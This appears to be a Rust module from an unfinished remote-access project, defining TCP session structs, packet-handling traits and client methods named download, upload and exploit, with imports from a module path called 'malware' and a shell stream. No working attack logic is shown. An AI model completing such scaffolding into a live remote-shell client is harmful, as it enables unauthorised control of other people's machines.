
#![allow(dead_code)]

use std::{
    io::Error,
    net::{IpAddr, TcpStream, ToSocketAddrs},
    mem::replace
};

use crate::{
    Application::malware::utils::shell::ShellStream,
    structure::utils::{
        enums::{
            HandshakeType,
            Packet,
            ParseError,
        },
        structs::{
            define::EncryptionInfo,
            define::StructStone,
            define::PacketOption
        }
    },
    utility::secure::{
        utils::{AesGcmSivCrypto, RsaCrypto},
    },
};
use crate::structure::utils::traits::{PacketPreset, PacketTest};

pub struct SecureSession { // 핸드세이크, 암호화 통신 구조가 아직 확립되지 않음
    pub(crate) encryption: EncryptionInfo,
    pub(crate) socket: TcpStream,
    pub(crate) recv_packet: Packet,
    pub(crate) send_packet: Packet,
    pub(crate) cipher: Cipher,
}


pub struct NormalSession {
    pub(crate) socket: TcpStream,
    pub(crate) recv_packet: Packet,
    pub(crate) send_packet: Packet,
    pub(crate) packet_build_option: PacketOption
}

pub(crate) struct Cipher {
    pub(crate) aes: AesGcmSivCrypto,
    pub(crate) rsa: RsaCrypto,
}

pub struct ProtocolEditor {
    session: NormalSession,
    exploits: ShellStream,
}

type SResult<T> = std::io::Result<T>;

pub trait PacketProcessing {
    fn save_packet(&mut self, packet: Packet);
    fn peek_packet(&self) -> &Packet;
    fn load_packet(&mut self) -> Packet;
    fn set_packet(&mut self, packet: Packet);
    fn take_packet(&self) -> &Packet;
    fn get_packet(&mut self) -> Packet;
}

pub trait SecureSessionLayer:PacketPreset + HandleSessions + HandleClient {

}

pub trait NormalSessionLayer:PacketPreset + HandleSessions + HandleClient {
    // 아마도 HandleSessions 을 대신하게 되지 않을까 생각중
}

pub trait HandleSessions { // 어떻게 잘 하면 노멀 세션이랑 보안 세션을 잘 조합할수 있지 않을까? 트레이트 상속으로 될거같다
    fn new<A: ToSocketAddrs>(address: A, packet: Packet) -> Result<(TcpStream,Packet), (Error, Packet)>;
    fn normal(address: IpAddr, packet: Packet) -> NormalSession;
    fn establish_connection(address: IpAddr, conn_type: EncryptionInfo, packet: Packet, attempts: u32) -> NormalSession;
    fn optional(address: IpAddr, encryption: EncryptionInfo) -> NormalSession;
    fn is_connected(&self) -> bool;
    fn reconnection(&mut self) -> Result<NormalSession, Error>;
    fn send(&mut self) -> Result<Packet, Error>;
    fn recv(&mut self, buffer_size: usize) -> Vec<u8>;
    fn receiving(&mut self, buffer: StructStone) -> &Packet;
    fn send_disconnect(&mut self) -> SResult<()>;
}

pub trait HandleClient:PacketPreset {
    fn response(&mut self, msg: &str) -> SResult<Packet>;
    fn disconnect(&mut self);
    fn download(&mut self) -> SResult<Packet>;
    fn upload(&mut self) -> SResult<Packet>;
    fn exploit(&mut self) -> SResult<Packet>;
}

pub trait Handlers {
    fn default_client_handler(&mut self);
}
impl NormalSession {
    pub fn take_socket(&self) -> &TcpStream {
        &self.socket
    }
    pub fn set(socket: TcpStream) -> NormalSession {
    // pub fn set(encryption: EncryptionInfo, socket: TcpStream) -> NormalSession {
        // let cipher = Cipher { aes: AesGcmSivCrypto::default(), rsa: RsaCrypto::default() };
        // NormalSession { encryption, socket,  cipher, recv_packet: Packet::Default, send_packet: Packet::Default }
        NormalSession {
            socket,
            recv_packet: Default::default(),
            send_packet: Default::default(),
            packet_build_option: Default::default(),
        }
    }
    // pub fn take_handshake_type(&self) -> &HandshakeType {
    //     &self.encryption.Handshake_Type
    // }

    // pub fn set_encryption(&mut self, encryption: EncryptionInfo) {
    //     self.encryption = encryption;
    //     match self.encryption.Type {
    //         EncryptType::NoEncryption => {}
    //         _ => {
    //             self.cipher.aes.setup().expect("self.aes_cipher.setup()");
    //             self.cipher.rsa.setup().expect("self.rsa_cipher.setup()");
    //         }
    //     }
    // }
    pub fn with_send_packet(mut self, packet: Packet) -> Self {
        self.send_packet = packet;
        self
    }

    pub fn with_recv_packet(mut self, packet: Packet) -> Self {
        self.recv_packet = packet;
        self
    }
}

impl PacketProcessing for NormalSession {
    fn save_packet(&mut self, packet: Packet) { self.recv_packet = packet }
    fn peek_packet(&self) -> &Packet { &self.recv_packet }
    fn load_packet(&mut self) -> Packet { replace(&mut self.recv_packet, Packet::Default) }
    fn set_packet(&mut self, packet: Packet) { self.send_packet = packet }
    fn take_packet(&self) -> &Packet { &self.send_packet }
    fn get_packet(&mut self) -> Packet { replace(&mut self.send_packet, Packet::Default) }
}

